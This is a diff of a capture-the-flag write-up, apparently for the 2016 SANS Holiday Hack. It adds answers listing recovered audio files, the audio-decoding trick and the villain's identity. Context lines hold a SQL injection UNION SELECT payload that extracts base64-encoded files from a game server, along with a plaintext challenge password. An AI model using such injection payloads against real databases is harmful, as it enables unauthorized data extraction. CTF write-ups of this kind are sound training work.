@@ -979,6 +979,11 @@ Content-Length: 164
 date=2017-01-06&type=usage_reports` UNION SELECT id, username, filename, TO_BASE64(mp3), id FROM `audio` # &field%5B%5D=udid&modifier%5B%5D=gt&value%5B%5D=1&save=on
 ```
 
+In the response, you will get this buried inside of the bug table.
+```
+<tr><td>3746d987-b8b1-11e6-89e1-42010af00008</td><td>administrator</td><td>discombobulatedaudio7.mp3</td><td>SUQzAwAAAAAAGFRSQ0sAAAACAAAAN1RJVDIAAAACAAAAN//7kGQAAAAAAAAAAAAAAAAAAAAAAAAA ...
+```
+
 You can `base64 -D` the file afterwards.
 
 > ads.northpolewonderland.com 104.198.221.240
@@ -1297,4 +1302,39 @@ password=busyreindeer78
 
 ### 7) ONCE YOU GET APPROVAL ...
 
+See above for a description of the attacks.
+
 ### 8) What are the names of the audio files you discovered from each system above?
+
+* The Mobile Analytics Server (via credentialed login access)
+  * `discombobulatedaudio2.mp3`
+* The Dungeon Game
+  * `discombobulatedaudio3.mp3`
+* The Debug Server
+  * `debug-20161224235959-0.mp3` aka `discombobulatedaudio4.mp3`
+* The Banner Ad Server
+  * `discombobulatedaudio5.mp3`
+* The Uncaught Exception Handler Server
+  * `discombobulated-audio-6-XyzE3N9YqKNH.mp3` aka `discombobulated6.mp3`
+* The Mobile Analytics Server (post authentication)
+  * `discombobulatedaudio7.mp3`
+
+## Part 5: Discombobulated Audio
+
+### 9) Who is the villain behind the nefarious plot.
+
+You need to throw the files into something like `audacity` and increase the tempo by approx. 400 percent. I had to look this up in another write-up.
+
+You end up with the phrase `Merry Christmas Santa Claus Or As I Was Known In Jeff`.
+
+The villain is Dr. Who.
+
+![Dr. Who](screens/dr-who.png)
+
+Credits
+
+![Credits](screens/final.png)
+
+### 10) Why had the villain abducted Santa?
+
+Because of the Star Wars Holiday Special.
